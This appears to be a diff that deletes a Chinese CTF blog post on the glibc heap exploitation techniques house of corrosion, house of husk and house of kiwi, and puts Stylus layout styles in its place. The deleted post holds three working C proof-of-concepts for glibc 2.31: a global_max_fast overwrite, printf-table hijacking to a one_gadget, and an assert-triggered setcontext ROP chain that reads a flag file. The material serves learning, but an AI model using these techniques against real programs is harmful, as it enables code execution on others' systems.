@@ -145,247 +145,198 @@
             <div class="main-content">
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    $avatarWidth = 46px;
+$arrow-icon-width = 16px;
+$post-nav-max-width = 220px;
+$article-title-font-size = 1.6rem;
 
-        <div class="article-title">
-            <span class="title-hover-animation">house of corrosion/husk/kiwi</span>
-        </div>
+.article-content-container {
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ai.jpg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2022-03-11 11:42:43
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/pwn/">pwn</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/house-of-%E7%B3%BB%E5%88%97/">house of 系列</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+  keep-container(false, 0, 0, 30px, 30px);
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>1.3k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>6 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-</div>
+  .article-title {
+    color: var(--second-text-color);
+    font-weight: 600;
+    font-size: $article-title-font-size;
 
-                    </div>
-                </div>
-            </div>
-        
+    +keep-tablet() {
+      font-size: $article-title-font-size * 0.9;
+    }
 
-        <div class="article-content markdown-body">
-            <p>这篇文章过后估计就会慢下来更新了，内核一直拖着没学，再就是自己逆向能力很差所以也打算多练点题了，因为时间关系这篇文章我就少一点源码的讲解了。</p>
-<h2 id="house-of-corrosion"><a href="#house-of-corrosion" class="headerlink" title="house of corrosion"></a>house of corrosion</h2><p>在large bin attack和tcache stashing unlink当中我们可以实现任意地址写入很大的数，那么我们写入这个数的作用是什么呢？</p>
-<p>这一利用方式就是通过其他攻击方式修改global_max_fast的值为一个很大的值，这就导致我们生成的chunk为一个fast bin chunk，然而chunk在进入fast bin时是遵循一定规律的，free时会根据size进入到相应的地址，这也就促使我们可以进一步利用了。</p>
-<p>首先这里的计算公式为：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size = ((target - main_arena) * <span class="number">2</span>) - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
-
-<p>第一种方式也就是在fastbinY后的任意地址写入堆地址</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220308171542436.png"
-                      alt="image-20220308171542436"
-                ></p>
-<p>当我们取出这个chunk时，会将fd指针留在相应的位置，所以如果存在UAF就可以更进一步的实现任意地址写任意值</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220308171727077.png"
-                      alt="image-20220308171727077"
-                ></p>
-<p>下面是以上两个方法的poc可以直接在glibc2.31下使用</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> offset2size(ofs) ((ofs)*2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAIN_ARENA 0x1ebb80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GLOBAL_MAX_FAST 0x1eeb80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTF_FUNCTABLE 0x1f0ff8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTF_ARGINFO 0x1f1350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_GADGET 0xe6c81</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> libc_base;</span><br><span class="line">    <span class="keyword">char</span> *ptr0;</span><br><span class="line">    <span class="keyword">char</span> *ptr1;</span><br><span class="line">    <span class="keyword">char</span> *ptr2;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    ptr0 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">    ptr2 = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">    <span class="built_in">free</span>(ptr0);</span><br><span class="line">    libc_base = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)ptr0 - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *aaa = libc_base + GLOBAL_MAX_FAST;</span><br><span class="line">    *aaa = ptr0;</span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="built_in">free</span>(ptr2);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr1, <span class="string">&quot;aaaaaaaa&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h2><p>这一堆利用主要针对的是printf的利用链，具体链子不再关心，我们的最终效果是劫持<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>到我们堆地址，然后伪造格式化字符串对应的地址的值one_gadget</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAIN_ARENA       0x1ebb80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GLOBAL_MAX_FAST  0x1eeb80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTF_FUNCTABLE 0x1f0ff8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTF_ARGINFO   0x1f1350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_GADGET       0xe6c81</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> libc_base;</span><br><span class="line">  <span class="keyword">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lxn&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> *aaa=libc_base+GLOBAL_MAX_FAST;</span><br><span class="line">  *aaa=a[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最终实现的就是污染掉__printf_arginfo_table但是另一个table也不能为null所以也伪造上，不过不需要弄什么数据。</p>
-<p>具体过程大家可以去调试，这里用到了house of corrosion</p>
-<h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>这一调用链通过触发__malloc_assert，调用fflush进而调用stderr中的_IO_file_jumps中的sync指针</p>
-<p>触发的方式也会有很多种，这里常用的就是在验证top chunk中的一种，<a href="https://cv196082.gitee.io/2022/03/03/house-of/">house of force</a>这篇文章中利用这是需要绕过这一assert，可以去看一下是什么assert</p>
-<p>gdb调试assert时发现fflush调用的是位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且观察发现RDX寄存器的值为<code>IO_helper_jumps</code>指针,多次调试发现RDX始终是一个固定的地址</p>
-<p>如果存在一个任意写,通过修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<a href="https://cv196082.gitee.io/2022/03/10/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8Bsetcontext/">setcontext+61</a><br>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220311103015542.png"
-                      alt="image-20220311103015542"
-                ></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"><span class="keyword">size_t</span> libc_base;</span><br><span class="line"><span class="keyword">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="keyword">char</span> FLAG[<span class="number">0x100</span>] = <span class="string">&quot;./flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span>&#123;</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0xC000003E</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x35</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x0000003B</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7FFF0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> &#123;<span class="number">8</span>, sfi&#125;;</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setROP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)write;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    sandbox();</span><br><span class="line">    libc_base  = ((<span class="keyword">size_t</span>)setvbuf) - <span class="number">0x81630</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> magic_gadget = libc_base + <span class="number">0x53030</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line">    <span class="keyword">size_t</span> IO_helper = libc_base + <span class="number">0x1E48C0</span>; <span class="comment">// _IO_hel</span></span><br><span class="line">    per_jumps;</span><br><span class="line">    <span class="keyword">size_t</span> SYNC = libc_base + <span class="number">0x1E5520</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line">    setROP();</span><br><span class="line">    *((<span class="keyword">size_t</span>*)IO_helper + <span class="number">0xA0</span>/<span class="number">8</span>) = ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="keyword">size_t</span>*)IO_helper + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    *((<span class="keyword">size_t</span>*)SYNC) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="keyword">size_t</span> *top_size = (<span class="keyword">size_t</span>*)((<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到就只是劫持了sync为setcontext+61然后就是通过IO_helper控制rdx进而控制其他所有寄存器，实现ROP</p>
-<p>例题的话，后续会更一篇NULL_FxCK，因为用的Glibc为2.32所以会出现一系列问题，所以不增加这篇文章篇幅了</p>
-<hr>
-<p>参考链接：<a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598" >https://www.anquanke.com/post/id/235598<i class="fas fa-external-link-alt"></i></a></p>
-
-        </div>
-
-        
-
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/03/21/kernel-pwn%E5%9F%BA%E7%A1%80/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">kernel pwn基础</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2022/03/10/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8Bsetcontext/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">从两道题目看setcontext</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
-
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
-    </div>
-    
-
-        
-            
-    <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
-        <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
-            }
-
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
-            } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
-            }
-        </script>
-    </div>
+    +keep-mobile() {
+      font-size: $article-title-font-size * 0.8;
+    }
+  }
 
 
+  .article-header {
+    position: relative;
+    padding-left: $avatarWidth;
+    width: 100%;
+    height: $avatarWidth;
+    box-sizing: border-box;
 
-        
-    
-</div>
+    .avatar {
+      position: absolute;
+      top: 0
+      left: 0;
+      width: $avatarWidth;
+      height: $avatarWidth;
+      padding: 1px;
+      box-sizing: border-box;
+      border: 1px solid var(--border-color);
+      border-radius: 50%;
 
-            </div>
-        
-    </div>
-</div>
+      img {
+        border-radius: 50%;
+        width: 100%;
+        height: 100%;
+        background: var(--avatar-background-color);
+      }
+
+    }
+
+
+    .info {
+      padding: 2px 0;
+      margin-left: 10px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 100%;
+      height: 100%;
+
+      .author {
+        font-weight: 600;
+        font-size: 1.18rem;
+        display: flex;
+        align-items: center;
+
+        .name {
+          color: var(--default-text-color);
+        }
+
+        .author-label {
+          margin-left: 10px;
+          font-size: 0.8rem;
+          font-weight: 500;
+          padding: 0 5px;
+          border-radius: 5px;
+          color: #fff;
+          background: var(--selection-color);
+        }
+
+      }
+    }
+
+  }
+
+
+  .article-header, .article-header-meta-info {
+    margin-top: 16px;
+    +keep-tablet() {
+      transform: scale(0.9);
+      transform-origin: left top;
+    }
+  }
+
+
+  .article-content {
+    margin-top: $component-spacing-value;
+    padding-bottom: 10px;
+    word-wrap: break-word;
+    border-bottom: 1px solid var(--border-color);
+    color: var(--default-text-color);
+  }
+
+  .post-copyright-info {
+    margin-top: $component-spacing-value;
+    width: 100%;
+  }
+
+  .article-nav {
+    height: 40px;
+    margin-top: $component-spacing-value;
+
+    .article-prev, .article-next {
+      max-width: $post-nav-max-width;
+      height: 100%;
+      box-sizing: border-box;
+
+      keep-container(true, 1.03, 1.03, 10px, 0);
+
+      a {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 100%;
+        box-sizing: border-box;
+
+        &.prev {
+          padding-left: $arrow-icon-width;
+        }
+
+        &.next {
+          padding-right: $arrow-icon-width;
+        }
+
+        .arrow-icon {
+          position: absolute;
+          top: 0;
+          height: 100%;
+          width: $arrow-icon-width;
+
+          &.left {
+            left: 0;
+          }
+
+          &.right {
+            right: 0;
+          }
+        }
+
+        .title {
+          width: 100%;
+          height: 100%;
+        }
+      }
+
+    }
+
+    .article-prev {
+      float: left;
+    }
+
+    .article-next {
+      float: right;
+    }
+
+    .post-nav-item {
+      display: none;
+
+      +keep-tablet() {
+        display: inline-block;
+      }
+
+    }
+
+
+    .post-nav-title-item {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+
+      +keep-tablet() {
+        display: none;
+      }
+    }
+
+  }
+
+
+}
+
 
 
                 
